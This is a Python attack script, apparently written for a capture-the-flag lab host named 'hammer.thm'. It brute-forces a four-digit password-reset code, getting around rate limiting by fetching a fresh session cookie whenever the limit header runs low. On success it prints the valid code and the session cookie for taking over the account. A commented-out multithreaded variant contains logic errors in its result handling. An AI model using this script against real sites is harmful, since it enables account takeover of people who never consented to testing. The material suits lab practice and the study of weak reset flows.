import requests
# from concurrent.futures import ThreadPoolExecutor

# Define the URLs for password recovery
hammer_ip = 'hammer.thm'
hammer_port = '1337' # default 80
hammer_full = f'{hammer_ip}:{hammer_port}'
hammer_url = f'http://{hammer_ip}:{hammer_port}'
recovery_url = f'{hammer_url}/reset_password.php'

# Define password recovery credentials
credentials = {
    'email': 'tester@hammer.thm'
}

# Function to get a fresh cookie
def get_cookie(url,payload):
	headers={
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
	}

	session = requests.Session()
	response = session.post(url, headers=headers, data=payload)
	return session, session.cookies.get("PHPSESSID", None)

# Function to brute force OTP
def submit_code(session, url, code):
	payload={
		'recovery_code': code,
		's': '160'
	}
	headers={
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
	}

	response = session.post(url, headers=headers, data=payload)
	return response



# Code for using only one thread
# Get first cookie
session, cookie = get_cookie(recovery_url, credentials)
for i in range(10000):
	recovery_code = f"{i:04d}" # Generate codes 0000-9999
	print(f"Trying...{recovery_code}")
	
	# Submit the code
	response = submit_code(session, recovery_url, recovery_code)
	
	#Get a new cookie if the Rate-Limit-Pending = 1
	if int(response.headers['Rate-Limit-Pending']) <2:
		 session, cookie = get_cookie(recovery_url,credentials)

	# Break the loop if we find a valid code and print the cookie to use
	if "Invalid" not in response.text and response.status_code in (302,200):
		print(f"FOUND------ valid code found {recovery_code}")
		print(f"USE this cookie: {cookie}")
		break


"""
# Worker function for threads
def worker(recovery_code):
    # Create a new session and fetch a cookie for this thread
    session, cookie = get_cookie(recovery_url, credentials)

    # Attempt the recovery code
    response = submit_code(session, recovery_url, recovery_code)

    if "Invalid" not in response.text and response.status_code in (302,200):
        print(f"Valid code found by thread: {recovery_code}. Cookie {cookie}")
        return 200

# Multithreaded execution
with ThreadPoolExecutor(max_workers=10) as executor:
    codes = [f"{i:04d}" for i in range(10000)]  # Generate codes 0000-9999
    results = list(executor.map(worker, codes))
    if results == 200:
        exit()

# Filter out None results to find valid codes
valid_codes = [code for code in results if code]
print("Valid codes found:", valid_codes)
"""
